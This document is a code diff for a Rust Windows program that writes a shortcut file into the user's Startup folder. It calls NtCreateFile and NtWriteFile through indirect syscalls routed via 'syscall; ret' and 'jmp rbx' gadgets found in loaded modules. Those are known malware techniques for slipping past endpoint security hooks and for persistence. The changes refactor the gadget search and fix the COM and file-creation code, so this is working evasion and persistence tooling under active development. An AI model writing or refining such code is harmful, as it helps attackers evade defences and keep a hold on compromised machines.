@@ -10,13 +10,12 @@ mod syscalls;
 use std::ptr::null_mut;
 use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
-use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
+use windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_NORMAL;
 use windows_sys::Win32::System::Com::{
-    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
-    IStream, CoTaskMemFree,
+    CoInitialize, CoCreateInstance, CLSCTX_ALL, IStream, CoTaskMemFree,
 };
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
-use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_CREATE};
+use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_DONT_VERIFY};
 use windows_sys::core::GUID;
 
 const FOLDERID_Startup: GUID = GUID {
@@ -31,6 +30,20 @@ const CLSID_ShellLink: GUID = GUID {
     data2: 0xE33D,
     data3: 0x11CF,
     data4: [0x8F, 0x1C, 0x00, 0x80, 0xC7, 0x44, 0x13, 0x78],
+};
+
+const IID_IPersistStream: GUID = GUID {
+    data1: 0x00000109,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
+};
+
+const IID_IShellLinkW: GUID = GUID {
+    data1: 0x000214F9,
+    data2: 0x0000,
+    data3: 0x0000,
+    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
 };
 
 #[repr(C)]
@@ -116,20 +129,6 @@ struct IStreamVtbl {
     Clone: usize,
 }
 
-const IID_IPersistStream: GUID = GUID {
-    data1: 0x00000109,
-    data2: 0x0000,
-    data3: 0x0000,
-    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
-};
-
-const IID_IShellLinkW: GUID = GUID {
-    data1: 0x000214F9,
-    data2: 0x0000,
-    data3: 0x0000,
-    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
-};
-
 #[repr(C)]
 pub struct OBJECT_ATTRIBUTES {
     pub Length: u32,
@@ -147,12 +146,13 @@ pub struct IO_STATUS_BLOCK {
 }
 
 const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
-const FILE_OVERWRITE_IF: u32 = 0x00000005;
+const FILE_OPEN_IF: u32 = 0x00000003;
 const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
 const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
 const SYNCHRONIZE: u32 = 0x00100000;
 
 fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
+    // Length is in bytes, excluding null terminator
     let len = (buffer.len() - 1) * 2;
     UNICODE_STRING {
         Length: len as u16,
@@ -163,8 +163,11 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 
 fn main() {
     unsafe {
-        // Initialize COM early
-        CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);
+        // Initialize COM (STA)
+        let hr = CoInitialize(null_mut());
+        if hr != S_OK && hr != 0x00040102 { // S_FALSE or RPC_E_CHANGED_MODE are acceptable
+            // continue anyway, maybe it was already initialized
+        }
 
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
@@ -174,28 +177,11 @@ fn main() {
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
 
-        let mut syscall_gadget: *mut c_void = null_mut();
-        let mut jmp_rbx_gadget: *mut c_void = null_mut();
-
-        syscalls::for_each_module(|base, _name| {
-            if syscall_gadget.is_null() {
-                if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0x0F, 0x05, 0xC3]]) {
-                    syscall_gadget = g as *mut c_void;
-                }
-            }
-            if jmp_rbx_gadget.is_null() {
-                if let Some(g) = syscalls::find_gadget(base as *const u8, &[&[0xFF, 0xE3], &[0x53, 0xC3]]) {
-                    jmp_rbx_gadget = g as *mut c_void;
-                }
-            }
-            !syscall_gadget.is_null() && !jmp_rbx_gadget.is_null()
-        });
-
-        if syscall_gadget.is_null() || jmp_rbx_gadget.is_null() { return; }
+        let syscall_gadget = syscalls::find_gadget_globally(&[&[0x0F, 0x05, 0xC3]]).expect("Failed to find syscall gadget");
+        let jmp_rbx_gadget = syscalls::find_gadget_globally(&[&[0xFF, 0xE3], &[0x53, 0xC3]]).expect("Failed to find jmp rbx gadget");
 
         let mut path_ptr: *mut u16 = null_mut();
-        // Use KF_FLAG_CREATE to ensure folder exists
-        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
+        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DONT_VERIFY as u32, 0, &mut path_ptr) != S_OK {
             return;
         }
 
@@ -254,39 +240,38 @@ fn main() {
 
                                 let status = crate::syscall!(
                                     nt_create_file_ssn,
-                                    syscall_gadget as *const u8,
-                                    jmp_rbx_gadget as *const u8,
+                                    syscall_gadget,
+                                    jmp_rbx_gadget,
                                     &mut out_handle as *mut _ as usize,
                                     (GENERIC_WRITE | SYNCHRONIZE) as usize,
                                     &mut obj_attr as *mut _ as usize,
                                     &mut io_status as *mut _ as usize,
-                                    0,
+                                    0, // AllocationSize
                                     FILE_ATTRIBUTE_NORMAL as usize,
-                                    0,
-                                    FILE_OVERWRITE_IF as usize,
+                                    0, // ShareAccess
+                                    FILE_OPEN_IF as usize,
                                     (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
-                                    0,
-                                    0
+                                    0, // EaBuffer
+                                    0  // EaLength
                                 );
 
                                 if status == 0 {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
-                                    let mut byte_offset: i64 = 0;
                                     crate::syscall!(
                                         nt_write_file_ssn,
-                                        syscall_gadget as *const u8,
-                                        jmp_rbx_gadget as *const u8,
+                                        syscall_gadget,
+                                        jmp_rbx_gadget,
                                         out_handle as usize,
-                                        0,
-                                        0,
-                                        0,
+                                        0, // Event
+                                        0, // ApcRoutine
+                                        0, // ApcContext
                                         &mut write_io_status as *mut _ as usize,
                                         data_ptr as usize,
                                         stat.cbSize as u32,
-                                        &mut byte_offset as *mut _ as usize,
-                                        0
+                                        0, // ByteOffset (NULL means current position, which is 0 for new file)
+                                        0  // Key
                                     );
-                                    crate::syscall!(nt_close_ssn, syscall_gadget as *const u8, jmp_rbx_gadget as *const u8, out_handle as usize);
+                                    crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
                                 }
                                 GlobalUnlock(hglobal);
                             }
